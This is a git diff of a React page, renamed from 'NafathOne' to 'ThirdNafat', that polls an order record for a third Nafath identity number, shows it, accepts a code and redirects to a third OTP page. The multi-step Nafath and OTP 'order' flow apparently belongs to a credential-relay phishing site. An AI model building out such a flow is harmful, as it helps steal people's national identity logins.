@@ -1,17 +1,16 @@
+import { useEffect, useState } from "react";
 import useOrderData from "../../Hooks/useOrderData";
-import { useState, useEffect } from "react";
-import Swal from "sweetalert2"; 
-import { useNavigate } from "react-router-dom"; 
+import { useNavigate } from "react-router-dom";
+import Swal from "sweetalert2";
 import TextField from "@mui/material/TextField";
 import { FaArrowRightLong } from "react-icons/fa6";
 
-const NafathOne = () => {
-  const { orderData,lastOrder, refetch } = useOrderData();
-  const nafat = lastOrder?.nafath1;
-  const [inputCode, setInputCode] = useState(""); 
-  const [error, setError] = useState(""); 
-  
-  const navigate = useNavigate(); 
+const ThirdNafat = () => {
+  const { lastOrder, refetch } = useOrderData();
+  const nafat = lastOrder?.nafath3;
+  const [inputCode, setInputCode] = useState("");
+  const [error, setError] = useState("");
+  const navigate = useNavigate();
 
   // Set up a refetch interval
   useEffect(() => {
@@ -32,11 +31,11 @@ const NafathOne = () => {
       Swal.fire({
         position: "top-end",
         icon: "success",
-        title: "First Nafat Verification done",
+        title: "Third Nafat Verification done",
         showConfirmButton: false,
         timer: 1500,
       }).then(() => {
-        navigate("/secondNafath"); // Redirect to secondNafath page
+        navigate("/thirdOTP"); // Redirect to secondNafath page
       });
 
       setError(""); // Clear any previous error
@@ -46,11 +45,10 @@ const NafathOne = () => {
   };
 
   console.log(nafat);
-
   return (
     <div>
       <h3 className="text-center text-4xl font-bold text-gray-700 my-5">
-        First Nafat
+        Third Nafat
       </h3>
 
       <div className="border-8 rounded-full w-44 h-44 text-center flex items-center justify-center mx-auto mb-5">
@@ -60,7 +58,7 @@ const NafathOne = () => {
           </p>
         ) : (
           <p className="flex flex-col justify-center font-medium">
-            First Nafat is <span>Loading...</span>
+            Third Nafat is <span>Loading...</span>
           </p>
         )}
       </div>
@@ -92,4 +90,4 @@ const NafathOne = () => {
   );
 };
 
-export default NafathOne;
+export default ThirdNafat;
